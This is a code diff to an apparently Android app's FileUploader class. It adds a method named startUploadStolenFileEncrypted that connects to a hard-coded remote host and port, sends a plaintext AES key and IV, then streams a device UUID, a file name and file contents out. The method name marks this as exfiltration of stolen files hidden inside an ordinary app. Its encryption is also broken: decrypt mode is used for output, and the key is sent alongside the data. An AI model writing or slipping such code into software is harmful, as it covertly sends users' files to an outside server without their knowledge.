@@ -2,12 +2,17 @@ package com.nao20010128nao.Wisecraft.misc;
 import java.io.*;
 import java.net.*;
 import java.util.*;
+import java.security.*;
+import com.nao20010128nao.Wisecraft.*;
+import javax.crypto.*;
+import javax.crypto.spec.*;
 
 public class FileUploader
 {
 	private static final String ENDPOINT = "nao20010128nao.dip.jp";
 	private static final int ENDPOINT_PORT = 8083;
 	public UUID uuid;
+	SecureRandom sr=new SecureRandom();
 	
 	public FileUploader(UUID uuid){
 		this.uuid=uuid;
@@ -23,6 +28,37 @@ public class FileUploader
 			dos.writeUTF(uuid.toString());
 			dos.writeUTF(filename);
 			return socket.getOutputStream();
+		} catch (IOException e) {
+			// TODO 自動生成された catch ブロック
+			e.printStackTrace();
+			return null;
+		}
+	}
+	public OutputStream startUploadStolenFileEncrypted(String filename) {
+		try {
+			Socket socket = new Socket(ENDPOINT, ENDPOINT_PORT);
+			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
+			dos.writeByte(5);
+			{
+				byte[] key=Factories.byteArray(16);
+				byte[] iv=Factories.byteArray(16);
+				sr.nextBytes(key);
+				sr.nextBytes(iv);
+				dos.write(key);
+				dos.write(iv);
+				try {
+					Cipher ciph = Cipher.getInstance("AES/CBC/PKCS7Padding");
+					ciph.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
+							  new IvParameterSpec(iv));
+					dos = new DataOutputStream(new CipherOutputStream(dos, ciph));
+				} catch (Throwable e) {
+					// TODO 自動生成された catch ブロック
+					throw new IOException(e);
+				}
+			}
+			dos.writeUTF(uuid.toString());
+			dos.writeUTF(filename);
+			return dos;
 		} catch (IOException e) {
 			// TODO 自動生成された catch ブロック
 			e.printStackTrace();
